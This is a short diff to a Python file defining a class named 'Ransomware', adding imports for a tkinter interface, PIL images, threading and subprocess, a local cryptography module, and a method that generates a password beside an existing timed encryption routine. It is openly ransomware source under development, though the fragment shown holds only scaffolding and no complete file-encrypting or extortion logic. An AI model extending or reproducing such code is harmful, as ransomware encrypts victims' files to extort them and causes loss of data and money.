@@ -1,6 +1,16 @@
+import platform
 import sys
 import os
+import fnmatch
 import time
+from tkinter import *
+from tkinter import messagebox
+from functools import partial
+from PIL import ImageTk, Image
+from threading import Thread
+import subprocess
+
+import modules.cryptography
 
 
 class Ransomware:
@@ -34,6 +44,10 @@ class Ransomware:
         stop = time.time()
         print('Encryption made in {}'.format(round(stop - start, 3)))
 
+
+    def gen_pass(self):
+        new_password = modules.cryptography.generate_password()
+        return new_password
 
 if __name__ == '__main__':
     pass
